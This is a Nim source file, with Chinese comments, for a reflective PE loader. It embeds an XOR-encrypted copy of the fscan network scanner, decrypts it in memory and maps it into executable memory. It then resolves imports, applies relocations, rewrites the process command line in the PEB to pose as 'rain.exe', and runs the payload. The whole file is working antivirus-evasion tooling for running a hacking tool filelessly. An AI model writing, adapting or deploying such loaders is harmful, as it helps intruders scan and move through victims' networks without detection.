import winim/lean
import std/[os, strutils]

# --- 1. 配置区域 ---
const
  RAW_EXE = staticRead("fscan.enc")
  XOR_KEY: byte = 0x42

# --- 2. 命令行参数劫持 (GCC 兼容汇编) ---
proc patchCommandLine(newCmd: string) =
  var pPeb: int
  # 使用 GCC 兼容的汇编语法读取 GS:[0x60]
  asm """
    movq %%gs:0x60, %0
    : "=r" (`pPeb`)
  """

  let pebPtr = cast[PPEB](pPeb)
  let pParams = pebPtr.ProcessParameters

  var wideCmd = newWideCString(newCmd)
  var unicodeStr: UNICODE_STRING

  let size = newCmd.len * 2
  unicodeStr.Length = cast[USHORT](size)
  unicodeStr.MaximumLength = cast[USHORT](size + 2)
  unicodeStr.Buffer = cast[PWSTR](wideCmd[0].addr)

  pParams.CommandLine = unicodeStr

# --- 3. 反映射加载核心 ---
proc runReflective() =
  let params = commandLineParams().join(" ")
  let newFullCmd = "rain.exe " & params

  var data = newSeq[byte](RAW_EXE.len)
  for i in 0 ..< RAW_EXE.len:
    data[i] = cast[byte](RAW_EXE[i]) xor XOR_KEY

  let pDosHeader = cast[PIMAGE_DOS_HEADER](data[0].addr)
  let pNtHeaders = cast[PIMAGE_NT_HEADERS](cast[int](pDosHeader) + pDosHeader.e_lfanew)

  let pImageBase = VirtualAlloc(nil, pNtHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  if pImageBase == nil: return

  copyMem(pImageBase, data[0].addr, pNtHeaders.OptionalHeader.SizeOfHeaders)

  var pSectionHeaderPtr = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](
    cast[int](addr pNtHeaders.OptionalHeader) + cast[int](pNtHeaders.FileHeader.SizeOfOptionalHeader)
  )

  for i in 0 ..< int(pNtHeaders.FileHeader.NumberOfSections):
    let pDest = cast[pointer](cast[int](pImageBase) + pSectionHeaderPtr[i].VirtualAddress)
    let pSrc = cast[pointer](cast[int](data[0].addr) + pSectionHeaderPtr[i].PointerToRawData)
    copyMem(pDest, pSrc, pSectionHeaderPtr[i].SizeOfRawData)

  # 修复 IAT
  var importDir = pNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
  if importDir.Size != 0:
    var importDescriptor = cast[PIMAGE_IMPORT_DESCRIPTOR](cast[int](pImageBase) + importDir.VirtualAddress)
    while importDescriptor.Name != 0:
      let libName = cast[PSTR](cast[int](pImageBase) + importDescriptor.Name)
      let hLib = LoadLibraryA(libName)
      if hLib != 0:
        var thunkData = cast[PIMAGE_THUNK_DATA](cast[int](pImageBase) + importDescriptor.FirstThunk)
        while thunkData.u1.AddressOfData != 0:
          if IMAGE_SNAP_BY_ORDINAL(thunkData.u1.Ordinal):
            thunkData.u1.Function = cast[int](GetProcAddress(hLib, cast[PSTR](thunkData.u1.Ordinal and 0xFFFF)))
          else:
            let importByName = cast[PIMAGE_IMPORT_BY_NAME](cast[int](pImageBase) + thunkData.u1.AddressOfData)
            thunkData.u1.Function = cast[int](GetProcAddress(hLib, cast[PSTR](addr importByName.Name)))
          thunkData = cast[PIMAGE_THUNK_DATA](cast[int](thunkData) + sizeof(int))
      importDescriptor = cast[PIMAGE_IMPORT_DESCRIPTOR](cast[int](importDescriptor) + sizeof(IMAGE_IMPORT_DESCRIPTOR))

  # 修复重定位
  let delta = cast[int](pImageBase) - cast[int](pNtHeaders.OptionalHeader.ImageBase)
  if delta != 0:
    var relocDir = pNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
    if relocDir.Size != 0:
      var pReloc = cast[PIMAGE_BASE_RELOCATION](cast[int](pImageBase) + relocDir.VirtualAddress)
      while pReloc.SizeOfBlock != 0:
        let count = (int(pReloc.SizeOfBlock) - sizeof(IMAGE_BASE_RELOCATION)) div sizeof(uint16)
        let pEntry = cast[ptr UncheckedArray[uint16]](cast[int](pReloc) + sizeof(IMAGE_BASE_RELOCATION))
        for i in 0 ..< count:
          let typeReloc = pEntry[i] shr 12
          let offset = pEntry[i] and 0xFFF
          if typeReloc == IMAGE_REL_BASED_DIR64:
            let pPatch = cast[ptr int](cast[int](pImageBase) + int(pReloc.VirtualAddress) + int(offset))
            pPatch[] += delta
        pReloc = cast[PIMAGE_BASE_RELOCATION](cast[int](pReloc) + pReloc.SizeOfBlock)

  if params.len > 0:
    patchCommandLine(newFullCmd)

  let entryPoint = cast[proc() {.stdcall.}](cast[int](pImageBase) + pNtHeaders.OptionalHeader.AddressOfEntryPoint)
  entryPoint()

when isMainModule:
  try:
    runReflective()
  except:
    discard
